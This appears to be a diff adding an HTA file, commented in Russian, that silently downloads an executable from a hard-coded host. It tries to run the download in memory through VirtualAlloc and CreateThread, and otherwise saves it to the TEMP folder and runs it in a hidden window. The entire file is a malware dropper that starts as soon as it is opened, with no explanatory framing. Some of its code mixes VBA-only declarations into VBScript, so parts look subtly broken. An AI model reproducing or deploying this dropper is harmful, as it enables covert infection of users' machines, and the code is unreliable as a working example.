@@ -1,0 +1,55 @@
+<html><head>
+<hta:application showInTaskbar="no" windowState="minimize" border="none"
+  caption="no" maximizeButton="no" minimizeButton="no" scroll="no"
+  singleInstance="yes"/>
+<script language="VBScript">
+' ---- Единственная настройка ----
+Const URL = "http://192.168.1.1:8080/payload.exe"
+' --------------------------------
+
+Private Declare PtrSafe Function VirtualAlloc   Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal dest As LongPtr, ByRef src As Any, ByVal length As LongPtr) As LongPtr
+Private Declare PtrSafe Function CreateThread  Lib "kernel32" (ByVal lpSA As Long, ByVal dwStack As Long, ByVal lpStartAddr As LongPtr, ByVal lpParam As Long, ByVal dwFlags As Long, ByRef dwTid As Long) As LongPtr
+
+Sub RunPayload()
+    ' 1. Загрузка через MSXML2 с fallback на WinHTTP
+    Dim data() As Byte
+    On Error Resume Next
+    Dim h : Set h = CreateObject("MSXML2.XMLHTTP.6.0")
+    h.Open "GET", URL, False
+    h.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    h.Send
+    If Err.Number <> 0 Or h.Status <> 200 Then
+        Err.Clear
+        Set h = CreateObject("WinHttp.WinHttpRequest.5.1")
+        h.Open "GET", URL, False
+        h.Send
+    End If
+    On Error GoTo 0
+    data = h.ResponseBody
+
+    ' 2. Попытка исполнения в памяти (работает в mshta.exe x86/x64)
+    Dim sc() As Byte
+    sc = data
+    Dim addr As LongPtr
+    addr = VirtualAlloc(0, UBound(sc) + 1, &H3000, &H40) ' MEM_COMMIT|RESERVE, PAGE_EXECUTE_READWRITE
+    If addr <> 0 Then
+        RtlMoveMemory addr, sc(0), UBound(sc) + 1
+        Dim tid As Long
+        CreateThread 0, 0, addr, 0, 0, tid
+        ' Дать потоку запуститься, затем закрыть окно
+        WScript.Sleep 2000
+    Else
+        ' Fallback: сохранить на диск и запустить
+        Dim p As String
+        p = Environ("TEMP") & "\" & Hex(Timer * 1000) & ".exe"
+        Dim s : Set s = CreateObject("ADODB.Stream")
+        s.Type = 1 : s.Open : s.Write data : s.SaveToFile p, 2 : s.Close
+        CreateObject("WScript.Shell").Run """" & p & """", 0
+        WScript.Sleep 3000
+    End If
+    Self.Close
+End Sub
+
+RunPayload
+</script></head><body></body></html>
